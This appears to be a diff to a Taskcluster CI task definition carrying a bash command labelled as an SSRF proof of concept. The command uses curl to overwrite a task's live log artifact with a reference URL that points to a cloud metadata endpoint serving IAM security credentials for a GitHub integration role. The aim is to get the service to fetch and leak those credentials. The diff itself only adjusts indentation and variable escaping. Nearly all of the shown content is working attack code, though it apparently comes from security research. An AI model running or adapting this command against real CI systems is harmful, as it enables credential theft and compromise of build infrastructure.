@@ -21,7 +21,7 @@ tasks:
       payload:
         maxRunTime: 600
         command:
-          - - /bin/bash
+           - - /bin/bash
             - -c
             - >-
               echo "=== SSRF PoC: overwriting livelog reference artifact ===" &&
@@ -29,7 +29,7 @@ tasks:
               RUN_ID=0 &&
               echo "Task ID: $TASK_ID" &&
               curl -s -X POST
-              "http://taskcluster/api/queue/v1/task/${TASK_ID}/runs/${RUN_ID}/artifacts/public%2Flogs%2Flive_backing.log"
+              "http://taskcluster/api/queue/v1/task/$${TASK_ID}/runs/$${RUN_ID}/artifacts/public%2Flogs%2Flive_backing.log"
               -H "Content-Type: application/json"
               -d "{\"storageType\":\"reference\",\"url\":\"http://172.18.0.1:9170/latest/meta-data/iam/security-credentials/taskcluster-github-role\",\"expires\":\"2099-01-01T00:00:00.000Z\",\"contentType\":\"text/plain\"}" &&
               echo "Artifact overwritten. Sleeping to let status handler pick it up..." &&
